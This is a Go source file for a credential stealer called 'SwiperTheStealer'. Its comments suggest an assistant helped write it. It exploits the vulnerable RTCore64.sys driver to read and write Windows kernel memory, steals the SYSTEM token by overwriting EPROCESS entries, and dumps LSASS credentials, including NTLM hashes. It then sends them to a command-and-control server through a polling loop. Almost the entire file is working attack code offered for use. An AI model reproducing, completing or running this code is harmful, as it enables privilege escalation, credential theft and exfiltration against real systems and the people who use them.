package main

import (
	"encoding/binary"
	"flag"
	"fmt"
	"os"
	"os/signal"
	"runtime"
	"syscall"
	"time"
	"unsafe"

	"swiper-the-stealer/internal/byovd"
	"swiper-the-stealer/internal/c2client"
	"swiper-the-stealer/internal/config"
	"swiper-the-stealer/internal/lsass"
	"swiper-the-stealer/pkg/logger"
)

// ===== CONSTANTS AND STRUCTURES (EXACT from your main.go) =====

const (
	DefaultConfigPath = "./config.json"
	AppVersion        = "1.0.0"
	AppName           = "SwiperTheStealer - Advanced Credential Extraction Engine"

	// RTCore64 exploitation constants from your reference main.go
	RTCORE64_MEMORY_READ_CODE  = 0x80002048
	RTCORE64_MEMORY_WRITE_CODE = 0x8000204c
	SYSTEM_PID                 = 4
	KERNEL_ADDRESS_MASK        = 0xFFFFF00000000000
	SEARCH_RANGE               = 0x1000
	KNOWN_TOKEN_OFFSET         = 0x248
	KEYSIZE                    = 32
	IVSIZE                     = 16
)

// Windows constants for RTCore64 device access (EXACT from your main.go)
const (
	GENERIC_READ    = 0x80000000 // Generic read access
	GENERIC_WRITE   = 0x40000000 // Generic write access
	OPEN_EXISTING   = 3          // Open existing file/device
	FILE_SHARE_READ = 1          // Allow shared read access
)

// ===== WINDOWS API DECLARATIONS (EXACT from your main.go) =====

var (
	modKernel32 = syscall.MustLoadDLL("kernel32.dll") // Load kernel32.dll for Windows API
	modPsapi    = syscall.MustLoadDLL("psapi.dll")    // Load psapi.dll for EnumDeviceDrivers

	procDeviceIoControl     = modKernel32.MustFindProc("DeviceIoControl")     // Get DeviceIoControl function
	procCreateFileW         = modKernel32.MustFindProc("CreateFileW")         // Get CreateFileW function
	procCloseHandle         = modKernel32.MustFindProc("CloseHandle")         // Get CloseHandle function
	procGetCurrentProcessId = modKernel32.MustFindProc("GetCurrentProcessId") // Get GetCurrentProcessId function
	procEnumDeviceDrivers   = modPsapi.MustFindProc("EnumDeviceDrivers")      // Get EnumDeviceDrivers function
)

// ===== RTCore64 STRUCTURES (EXACT from your main.go) =====

// RTCore64MemoryRead - Structure for RTCore64 memory read operations (EXACT from your main.go)
type RTCore64MemoryRead struct {
	Address uint64 // 64-bit kernel virtual address to read from
	Buffer  uint64 // 64-bit userland buffer address to store result
	Size    uint32 // Number of bytes to read
	Padding uint32 // Padding to align struct to 8 bytes
}

// RTCore64MemoryWrite - Structure for RTCore64 memory write operations (EXACT from your main.go)
type RTCore64MemoryWrite struct {
	Address uint64 // 64-bit kernel virtual address to write to
	Buffer  uint64 // 64-bit userland buffer address containing data
	Size    uint32 // Number of bytes to write
	Padding uint32 // Padding to align struct to 8 bytes
}

// ===== WINDOWS API WRAPPER FUNCTIONS (EXACT from your main.go) =====

// DeviceIoControl - Windows API wrapper for RTCore64 communication (EXACT from your main.go)
func DeviceIoControl(hDevice syscall.Handle, ioControlCode uint32, inBuffer *byte, inBufferSize uint32, outBuffer *byte, outBufferSize uint32, bytesReturned *uint32) error {
	// Call DeviceIoControl using syscall with 8 parameters (requires all 11 syscall9 parameters)
	r1, _, e1 := syscall.Syscall9(
		procDeviceIoControl.Addr(),             // Function address from kernel32.dll
		8,                                      // Number of actual parameters (8)
		uintptr(hDevice),                       // Handle to RTCore64 device
		uintptr(ioControlCode),                 // RTCORE64_MEMORY_READ_CODE or RTCORE64_MEMORY_WRITE_CODE
		uintptr(unsafe.Pointer(inBuffer)),      // Input buffer (RTCORE64_MEMORY_READ/WRITE struct)
		uintptr(inBufferSize),                  // Size of input buffer
		uintptr(unsafe.Pointer(outBuffer)),     // Output buffer (same struct, contains result)
		uintptr(outBufferSize),                 // Size of output buffer
		uintptr(unsafe.Pointer(bytesReturned)), // Number of bytes returned by driver
		0,                                      // Overlapped structure (NULL)
		0,                                      // Padding for 11-parameter syscall
	)
	if r1 == 0 { // DeviceIoControl returns 0 on failure
		return e1 // Return the Windows error code
	}
	return nil // Success
}

// CreateFileW - Windows API wrapper for device handle creation (EXACT from your main.go)
func CreateFileW(lpFileName string, dwDesiredAccess uint32, dwShareMode uint32, dwCreationDisposition uint32, dwFlagsAndAttributes uint32) (syscall.Handle, error) {
	// Convert Go string to UTF-16 pointer for Windows API
	fileNamePtr, err := syscall.UTF16PtrFromString(lpFileName)
	if err != nil {
		return 0, err
	}

	// Call CreateFileW using syscall9 with 7 parameters (requires all 11 syscall9 parameters)
	r1, _, e1 := syscall.Syscall9(
		procCreateFileW.Addr(),               // Function address from kernel32.dll
		7,                                    // Number of actual parameters (7)
		uintptr(unsafe.Pointer(fileNamePtr)), // File/device name (\\.\RTCore64)
		uintptr(dwDesiredAccess),             // Access mode (GENERIC_READ|GENERIC_WRITE)
		uintptr(dwShareMode),                 // Share mode (0 for exclusive)
		0,                                    // Security attributes (NULL)
		uintptr(dwCreationDisposition),       // Creation disposition (OPEN_EXISTING)
		uintptr(dwFlagsAndAttributes),        // Flags and attributes (0 for normal)
		0,                                    // Template file handle (NULL)
		0,                                    // Padding
		0,                                    // Padding
	)

	handle := syscall.Handle(r1)
	if handle == syscall.InvalidHandle { // Check for INVALID_HANDLE_VALUE
		return 0, e1 // Return the Windows error
	}
	return handle, nil // Return valid handle
}

// CloseHandle - Windows API wrapper for handle cleanup (EXACT from your main.go)
func CloseHandle(hObject syscall.Handle) error {
	// Call CloseHandle using syscall with 1 parameter
	r1, _, e1 := syscall.Syscall(
		procCloseHandle.Addr(), // Function address from kernel32.dll
		1,                      // Number of parameters
		uintptr(hObject),       // Handle to close
		0, 0,                   // Padding for 3-parameter syscall
	)
	if r1 == 0 { // CloseHandle returns 0 on failure
		return e1 // Return the Windows error
	}
	return nil // Success
}

// GetCurrentProcessId - Windows API wrapper to get current process ID (EXACT from your main.go)
func GetCurrentProcessId() uint32 {
	// Call GetCurrentProcessId using syscall with 0 parameters
	r0, _, _ := syscall.Syscall(
		procGetCurrentProcessId.Addr(), // Function address from kernel32.dll
		0,                              // Number of parameters (0)
		0, 0, 0,                        // No parameters needed
	)
	return uint32(r0) // Return process ID as uint32
}

// EnumDeviceDrivers - Windows API wrapper to enumerate kernel drivers (EXACT from your main.go)
func EnumDeviceDrivers(lpImageBase *uintptr, cb uint32, lpcbNeeded *uint32) error {
	// Call EnumDeviceDrivers using syscall with 3 parameters
	r1, _, e1 := syscall.Syscall(
		procEnumDeviceDrivers.Addr(),         // Function address from psapi.dll
		3,                                    // Number of parameters
		uintptr(unsafe.Pointer(lpImageBase)), // Array to receive driver base addresses
		uintptr(cb),                          // Size of array in bytes
		uintptr(unsafe.Pointer(lpcbNeeded)),  // Receives required buffer size
	)
	if r1 == 0 { // EnumDeviceDrivers returns 0 on failure
		return e1 // Return the Windows error
	}
	return nil // Success
}

// ===== RTCore64 MEMORY PRIMITIVES (EXACT from your main.go) =====

// ReadMemoryPrimitive - Read kernel memory using RTCore64 vulnerability (EXACT from your main.go)
func ReadMemoryPrimitive(hDevice syscall.Handle, address uint64, size uint32) ([]byte, error) {
	// Allocate buffer for reading kernel memory
	buffer := make([]byte, size)

	// Setup RTCore64 memory read structure
	readStruct := RTCore64MemoryRead{
		Address: address,                                     // Kernel virtual address to read
		Buffer:  uint64(uintptr(unsafe.Pointer(&buffer[0]))), // Userland buffer address
		Size:    size,                                        // Number of bytes to read
		Padding: 0,                                           // Padding for struct alignment
	}

	var bytesReturned uint32

	// Call RTCore64 driver to read kernel memory
	err := DeviceIoControl(
		hDevice,                              // RTCore64 device handle
		RTCORE64_MEMORY_READ_CODE,            // Memory read IOCTL code
		(*byte)(unsafe.Pointer(&readStruct)), // Input buffer (read request)
		uint32(unsafe.Sizeof(readStruct)),    // Size of input buffer
		(*byte)(unsafe.Pointer(&readStruct)), // Output buffer (same struct)
		uint32(unsafe.Sizeof(readStruct)),    // Size of output buffer
		&bytesReturned,                       // Bytes returned by driver
	)

	if err != nil {
		return nil, fmt.Errorf("RTCore64 memory read failed: %v", err)
	}

	return buffer, nil // Return kernel memory contents
}

// WriteMemoryPrimitive - Write kernel memory using RTCore64 vulnerability (EXACT from your main.go)
func WriteMemoryPrimitive(hDevice syscall.Handle, address uint64, data []byte) error {
	// Setup RTCore64 memory write structure
	writeStruct := RTCore64MemoryWrite{
		Address: address,                                   // Kernel virtual address to write
		Buffer:  uint64(uintptr(unsafe.Pointer(&data[0]))), // Userland buffer with data
		Size:    uint32(len(data)),                         // Number of bytes to write
		Padding: 0,                                         // Padding for struct alignment
	}

	var bytesReturned uint32

	// Call RTCore64 driver to write kernel memory
	err := DeviceIoControl(
		hDevice,                               // RTCore64 device handle
		RTCORE64_MEMORY_WRITE_CODE,            // Memory write IOCTL code
		(*byte)(unsafe.Pointer(&writeStruct)), // Input buffer (write request)
		uint32(unsafe.Sizeof(writeStruct)),    // Size of input buffer
		(*byte)(unsafe.Pointer(&writeStruct)), // Output buffer (same struct)
		uint32(unsafe.Sizeof(writeStruct)),    // Size of output buffer
		&bytesReturned,                        // Bytes returned by driver
	)

	if err != nil {
		return fmt.Errorf("RTCore64 memory write failed: %v", err)
	}

	return nil // Success
}

// ===== NTOSKRNL BASE ADDRESS DISCOVERY (EXACT from your main.go) =====

// GetNtoskrnlBase - Discover ntoskrnl.exe base address using EnumDeviceDrivers (EXACT from your main.go)
func GetNtoskrnlBase() (uint64, error) {
	// Allocate buffer for 1024 driver base addresses (should be enough for most systems)
	const maxDrivers = 1024
	driverBases := make([]uintptr, maxDrivers)
	var bytesNeeded uint32

	// Call EnumDeviceDrivers to get all kernel driver base addresses
	err := EnumDeviceDrivers(&driverBases[0], uint32(len(driverBases)*8), &bytesNeeded)
	if err != nil {
		return 0, fmt.Errorf("EnumDeviceDrivers failed: %v", err)
	}

	// Calculate number of drivers found
	numDrivers := bytesNeeded / 8
	if numDrivers == 0 {
		return 0, fmt.Errorf("no kernel drivers found")
	}

	// The FIRST driver returned by EnumDeviceDrivers is ALWAYS ntoskrnl.exe
	// This is a Windows guarantee - ntoskrnl.exe is the primary kernel image
	ntoskrnlBase := uint64(driverBases[0])

	// Validate the base address looks like a kernel address (must be in upper half)
	if (ntoskrnlBase & KERNEL_ADDRESS_MASK) == 0 {
		return 0, fmt.Errorf("invalid ntoskrnl base address: 0x%x (not in kernel range)", ntoskrnlBase)
	}

	fmt.Printf("[*] ntoskrnl.exe base address: 0x%x\n", ntoskrnlBase)
	return ntoskrnlBase, nil
}

// ===== DYNAMIC OFFSET DISCOVERY (EXACT from your main.go) =====

// FindOffsets - Dynamically discover PsInitialSystemProcess offset using brute force (EXACT from your main.go)
func FindOffsets(hDevice syscall.Handle, ntoskrnlBase uint64) (uint64, error) {
	fmt.Printf("[*] Searching for PsInitialSystemProcess offset...\n")

	// These are known PsInitialSystemProcess offsets for different Windows versions
	// We'll brute force through them to find the correct one for this system
	knownOffsets := []uint64{
		0x214180, // Windows 10 1809
		0x218340, // Windows 10 1903
		0x21a340, // Windows 10 1909
		0x21a340, // Windows 10 2004
		0x21a360, // Windows 10 20H2
		0x21a380, // Windows 10 21H1
		0x21a3a0, // Windows 10 21H2
		0x21a3c0, // Windows 11 21H2
		0x21a400, // Windows 11 22H2
	}

	// Try each known offset
	for i, offset := range knownOffsets {
		fmt.Printf("[*] Trying offset %d/9: 0x%x\n", i+1, offset)

		// Calculate PsInitialSystemProcess address
		psInitialSystemProcess := ntoskrnlBase + offset

		// Read the pointer at this address
		processPointer, err := ReadMemoryPrimitive(hDevice, psInitialSystemProcess, 8)
		if err != nil {
			fmt.Printf("[-] Failed to read offset 0x%x: %v\n", offset, err)
			continue
		}

		// Convert bytes to uint64 pointer
		if len(processPointer) != 8 {
			continue
		}
		systemProcessPointer := binary.LittleEndian.Uint64(processPointer)

		// Validate this looks like a kernel pointer (must be in upper half of virtual address space)
		if (systemProcessPointer & KERNEL_ADDRESS_MASK) == 0 {
			fmt.Printf("[-] Invalid pointer at offset 0x%x: 0x%x\n", offset, systemProcessPointer)
			continue
		}

		// Try to read the EPROCESS structure at this address
		eprocessData, err := ReadMemoryPrimitive(hDevice, systemProcessPointer, 0x100)
		if err != nil {
			fmt.Printf("[-] Failed to read EPROCESS at 0x%x: %v\n", systemProcessPointer, err)
			continue
		}

		// Check if this looks like a valid EPROCESS structure
		// Look for PID 4 (System process) at offset 0x180 in EPROCESS
		if len(eprocessData) >= 0x184 {
			pid := binary.LittleEndian.Uint32(eprocessData[0x180:0x184])
			if pid == SYSTEM_PID {
				fmt.Printf("[+] Found System process (PID %d) at 0x%x\n", pid, systemProcessPointer)
				fmt.Printf("[+] PsInitialSystemProcess offset: 0x%x\n", offset)
				return offset, nil
			}
		}

		fmt.Printf("[-] Offset 0x%x does not point to System process\n", offset)
	}

	return 0, fmt.Errorf("could not find PsInitialSystemProcess offset")
}

// ===== TOKEN VALIDATION AND STEALING (EXACT from your main.go) =====

// isValidToken - Validate if a token pointer looks legitimate (EXACT from your main.go)
func isValidToken(hDevice syscall.Handle, tokenPointer uint64) bool {
	// Token pointer must be in kernel address space (upper half)
	if (tokenPointer & KERNEL_ADDRESS_MASK) == 0 {
		return false
	}

	// Try to read the first part of the token structure
	tokenData, err := ReadMemoryPrimitive(hDevice, tokenPointer, 0x40)
	if err != nil {
		return false
	}

	// Check if this looks like a valid token structure
	// Token structures have specific patterns and magic values
	if len(tokenData) < 0x40 {
		return false
	}

	// Additional validation could be added here (checking token type, etc.)
	return true
}

// StealSystemToken - Steal SYSTEM token and replace current process token (EXACT from your main.go)
func StealSystemToken(hDevice syscall.Handle, ntoskrnlBase uint64, psInitialOffset uint64) error {
	fmt.Printf("[*] Starting SYSTEM token theft...\n")

	// Step 1: Get System process (PID 4) EPROCESS structure
	psInitialSystemProcess := ntoskrnlBase + psInitialOffset

	// Read the pointer to System process EPROCESS
	systemProcessPointer, err := ReadMemoryPrimitive(hDevice, psInitialSystemProcess, 8)
	if err != nil {
		return fmt.Errorf("failed to read PsInitialSystemProcess: %v", err)
	}

	systemProcessAddr := binary.LittleEndian.Uint64(systemProcessPointer)
	fmt.Printf("[*] System EPROCESS address: 0x%x\n", systemProcessAddr)

	// Step 2: Extract SYSTEM token from System process
	// Token is at offset 0x248 in EPROCESS structure (Windows 10/11)
	systemTokenAddr := systemProcessAddr + KNOWN_TOKEN_OFFSET

	systemTokenPointer, err := ReadMemoryPrimitive(hDevice, systemTokenAddr, 8)
	if err != nil {
		return fmt.Errorf("failed to read SYSTEM token pointer: %v", err)
	}

	systemToken := binary.LittleEndian.Uint64(systemTokenPointer)

	// Remove reference counter bits (lower 4 bits are reference counter)
	systemToken = systemToken &^ 0xF

	fmt.Printf("[*] SYSTEM token address: 0x%x\n", systemToken)

	// Validate the SYSTEM token
	if !isValidToken(hDevice, systemToken) {
		return fmt.Errorf("invalid SYSTEM token at 0x%x", systemToken)
	}

	// Step 3: Find current process in the process list
	currentPID := GetCurrentProcessId()
	fmt.Printf("[*] Current process PID: %d\n", currentPID)

	// Walk the process list starting from System process to find our process
	currentProcessAddr, err := findProcessByPID(hDevice, systemProcessAddr, currentPID)
	if err != nil {
		return fmt.Errorf("failed to find current process: %v", err)
	}

	fmt.Printf("[*] Current process EPROCESS: 0x%x\n", currentProcessAddr)

	// Step 4: Get current process token (to preserve reference counter)
	currentTokenAddr := currentProcessAddr + KNOWN_TOKEN_OFFSET

	currentTokenPointer, err := ReadMemoryPrimitive(hDevice, currentTokenAddr, 8)
	if err != nil {
		return fmt.Errorf("failed to read current token pointer: %v", err)
	}

	currentToken := binary.LittleEndian.Uint64(currentTokenPointer)

	// Extract reference counter from current token (lower 4 bits)
	referenceCounter := currentToken & 0xF

	// Step 5: Create new token with SYSTEM privileges but preserve reference counter
	newToken := systemToken | referenceCounter

	fmt.Printf("[*] Replacing token 0x%x with 0x%x (ref count: %d)\n",
		currentToken, newToken, referenceCounter)

	// Convert new token to bytes for writing
	newTokenBytes := make([]byte, 8)
	binary.LittleEndian.PutUint64(newTokenBytes, newToken)

	// Step 6: Write the SYSTEM token to current process
	err = WriteMemoryPrimitive(hDevice, currentTokenAddr, newTokenBytes)
	if err != nil {
		return fmt.Errorf("failed to write SYSTEM token: %v", err)
	}

	fmt.Printf("[+] SYSTEM token theft successful!\n")
	fmt.Printf("[+] Current process now has SYSTEM privileges\n")
	return nil
}

// findProcessByPID - Walk process list to find process with specific PID (EXACT from your main.go)
func findProcessByPID(hDevice syscall.Handle, systemProcessAddr uint64, targetPID uint32) (uint64, error) {
	// Start from System process and walk the ActiveProcessLinks doubly-linked list
	currentProcess := systemProcessAddr
	visited := make(map[uint64]bool)

	for {
		// Avoid infinite loops
		if visited[currentProcess] {
			break
		}
		visited[currentProcess] = true

		// Read PID from current EPROCESS (at offset 0x180)
		pidData, err := ReadMemoryPrimitive(hDevice, currentProcess+0x180, 4)
		if err != nil {
			return 0, fmt.Errorf("failed to read PID: %v", err)
		}

		pid := binary.LittleEndian.Uint32(pidData)

		// Check if this is the target process
		if pid == targetPID {
			return currentProcess, nil
		}

		// Get next process from ActiveProcessLinks.Flink (at offset 0x188)
		flinkData, err := ReadMemoryPrimitive(hDevice, currentProcess+0x188, 8)
		if err != nil {
			return 0, fmt.Errorf("failed to read Flink: %v", err)
		}

		flink := binary.LittleEndian.Uint64(flinkData)

		// Calculate next EPROCESS address (subtract ActiveProcessLinks offset)
		currentProcess = flink - 0x188

		// Validate next process address
		if (currentProcess & KERNEL_ADDRESS_MASK) == 0 {
			break
		}
	}

	return 0, fmt.Errorf("process with PID %d not found", targetPID)
}

// ===== MAIN FUNCTION WITH INTEGRATION (EXACT from your main.go) =====

func main() {
	// Parse command line arguments
	configFile := flag.String("config", "./config.json", "Path to configuration file")
	logLevel := flag.String("log", "INFO", "Log level (DEBUG, INFO, WARN, ERROR)")
	testMode := flag.Bool("test", false, "Run in test mode (RTCore64 exploit test only)")
	noC2 := flag.Bool("no-c2", false, "Run without C2 communication (standalone mode)")
	version := flag.Bool("version", false, "Show version information")

	flag.Parse()

	// Show version and exit if requested
	if *version {
		fmt.Printf("%s v%s\n", AppName, AppVersion)
		fmt.Printf("Go Runtime: %s\n", runtime.Version())
		fmt.Printf("Architecture: %s\n", runtime.GOARCH)
		fmt.Printf("Operating System: %s\n", runtime.GOOS)
		return
	}

	// Load configuration
	cfg, err := config.LoadConfig(*configFile)
	if err != nil {
		if os.IsNotExist(err) {
			cfg = createDefaultConfig()
			if err := cfg.SaveConfig(*configFile); err != nil {
				fmt.Fprintf(os.Stderr, "Failed to save default config: %v\n", err)
				os.Exit(1)
			}
			fmt.Printf("Created default configuration: %s\n", *configFile)
		} else {
			fmt.Fprintf(os.Stderr, "Failed to load configuration: %v\n", err)
			os.Exit(1)
		}
	}

	// Override log level from command line
	if *logLevel != "INFO" {
		cfg.Logging.Level = *logLevel
	}

	// Initialize logger
	log := logger.NewLogger(cfg.Logging.Level)

	log.Infof("=== %s v%s ===", AppName, AppVersion)
	log.Infof("Configuration loaded: %s", *configFile)
	log.Infof("Logging level: %s", cfg.Logging.Level)

	// **TOKEN STEALING DISABLED - DUMPING LSASS WITH CURRENT PRIVILEGES**
	if !*testMode {
		log.Warn("=== TOKEN STEALING SKIPPED - Running with Admin privileges ===")
		log.Info("Note: LSASS extraction works with Admin privileges (SeDebugPrivilege)")
		// Token stealing code commented out - LSASS dumping doesn't strictly require SYSTEM
		// Most credential extraction works fine with Admin + SeDebugPrivilege
	}

	// Initialize BYOVD (Bring Your Own Vulnerable Driver) for LSASS extraction
	rtExploit := byovd.NewRTCoreExploit(log)

	// Initialize RTCore driver connection
	if err := rtExploit.Initialize(); err != nil {
		log.Errorf("Failed to initialize RTCore64 driver: %v", err)
		log.Error("Ensure RTCore64.sys is loaded and the service is running")
		log.Error("Try: sc start RTCore64")
		os.Exit(1)
	}
	defer rtExploit.Close()

	// Initialize KERNEL MODE LSASS DUMPER - NO OPENPROCESS BULLSHIT!
	dumper := lsass.NewKernelLsassDumper(rtExploit, log)

	// Execute based on operating mode
	if *testMode {
		log.Info("Running in test mode...")
		runTestMode(rtExploit, log)
	} else if *noC2 {
		runStandaloneMode(dumper, log)
	} else {
		runC2Mode(cfg, dumper, log)
		waitForShutdown(log)
	}
}

// ===== HELPER FUNCTIONS FOR INTEGRATION =====

// runTestMode verifies RTCore functionality.
func runTestMode(exploit *byovd.RTCoreExploit, log *logger.Logger) {
	log.Info("Running in test mode - verifying RTCore functionality...")
	testAddr := uint64(0x1000)
	testData, err := exploit.ReadPhysicalMemory(testAddr, 0x100)
	if err != nil {
		log.Errorf("RTCore test failed: %v", err)
		os.Exit(1)
	}
	log.Infof("RTCore test successful - read %d bytes from 0x%x", len(testData), testAddr)
	log.Info("RTCore64.sys is operational and ready for credential extraction.")
}

// runStandaloneMode executes the credential extraction without C2 communication.
func runStandaloneMode(dumper *lsass.KernelLsassDumper, log *logger.Logger) {
	log.Info("=== STANDALONE MODE: COMPREHENSIVE ATTACK CHAIN ===")

	// PHASE 2: LSASS CREDENTIAL EXTRACTION (Token stealing already done in main)
	log.Info("Phase 2: Executing comprehensive LSASS credential extraction...")
	if dumper == nil {
		log.Error("KernelLsassDumper not available.")
		os.Exit(1)
	}

	credentials, err := dumper.DumpCredentials()
	if err != nil {
		log.Errorf("Kernel LSASS dumper failed: %v", err)
		log.Error("Check RTCore driver access and LSASS process availability.")
		os.Exit(1)
	}

	log.Infof("Successfully extracted %d credential sets:", len(credentials))
	for i, cred := range credentials {
		log.Infof("Credential %d: %s\\%s", i+1, cred.Domain, cred.Username)
		if cred.NTLM != "" {
			log.Infof("   NTLM: %s", cred.NTLM)
		}
		log.Infof("   Type: %s", cred.Type)
	}
	log.Info("Standalone credential extraction completed successfully.")
}

// runC2Mode initializes and manages the C2 communication loop.
func runC2Mode(cfg *config.Config, dumper *lsass.KernelLsassDumper, log *logger.Logger) {
	log.Info("Initializing C2 client...")
	c2 := c2client.NewC2Client(&cfg.C2, log)

	log.Info("Registering with C2 server...")
	if err := c2.Register(); err != nil {
		log.Errorf("Failed to register with C2 server, will retry: %v", err)
	}

	// Main C2 loop for fetching tasks and handling commands.
	go func() {
		for {
			cmd, err := c2.CheckIn()
			if err != nil {
				log.Warnf("Failed to check for C2 tasks: %v", err)
				time.Sleep(time.Duration(cfg.C2.PollIntervalSec) * time.Second)
				continue
			}

			if cmd != nil && cmd.Command == "lsass_dump" {
				go handleCredentialExtraction(cmd.TaskID, dumper, c2, log)
			}
			time.Sleep(time.Duration(cfg.C2.PollIntervalSec) * time.Second)
		}
	}()

	log.Info("SwiperTheStealer is operational and awaiting C2 commands...")
}

// handleCredentialExtraction is executed as a goroutine to handle a C2 task.
func handleCredentialExtraction(taskID string, dumper *lsass.KernelLsassDumper, c2 *c2client.C2Client, log *logger.Logger) {
	log.Infof("=== C2 TASK %s: COMPREHENSIVE ATTACK CHAIN ===", taskID)

	// LSASS CREDENTIAL EXTRACTION (Token stealing already done globally)
	log.Infof("Phase 2: Executing LSASS extraction for task: %s", taskID)
	if dumper == nil {
		log.Errorf("KernelLsassDumper not available for task %s", taskID)
		c2.SendError("lsass_dump", taskID, "KernelLsassDumper not initialized")
		return
	}

	credentials, err := dumper.DumpCredentials()
	if err != nil {
		errMsg := fmt.Sprintf("Credential extraction failed: %v", err)
		log.Errorf("Credential extraction failed for task %s: %v", taskID, err)
		c2.SendError("lsass_dump", taskID, errMsg)
		return
	}

	log.Infof("Successfully extracted %d credentials for task %s", len(credentials), taskID)

	// Convert to C2 format and send.
	c2Creds := make([]lsass.LSASSCredentials, len(credentials))
	for i, cred := range credentials {
		c2Creds[i] = lsass.LSASSCredentials{
			Username: cred.Username,
			Domain:   cred.Domain,
			NTLM:     cred.NTLM,
		}
	}

	if err := c2.SendCredentials(c2Creds, taskID); err != nil {
		log.Errorf("Failed to send credentials to C2 for task %s: %v", taskID, err)
		return
	}

	log.Infof("🚀 COMPREHENSIVE ATTACK COMPLETE: Credentials transmitted to C2 for task %s", taskID)
}

// waitForShutdown blocks until a termination signal is received.
func waitForShutdown(log *logger.Logger) {
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-sc
	log.Info("Shutdown signal received. Terminating SwiperTheStealer.")
}

// createDefaultConfig generates a default configuration if one is not found.
func createDefaultConfig() *config.Config {
	return &config.Config{
		C2: config.C2Config{
			ServerURL:         "http://127.0.0.1:8080",
			APIKey:            "your-secret-api-key",
			SkipTLSVerify:     true,
			TimeoutSeconds:    30,
			RequestTimeout:    30,
			HeartbeatInterval: 60,
			CheckinInterval:   10,
			RetryAttempts:     3,
			RetryDelayMs:      5000,
			PollIntervalSec:   5,
		},
		Logging: config.LoggingConfig{
			Level:      "INFO",
			OutputFile: "swiper.log",
		},
		BYOVD: config.BYOVDConfig{
			PreferredDriver: "RTCore64.sys",
			ScanDrivers:     []string{"RTCore64.sys", "DBUtilDrv2.sys", "gdrv.sys"},
			TestMode:        false,
			MemoryScanSize:  1048576,
		},
	}
}
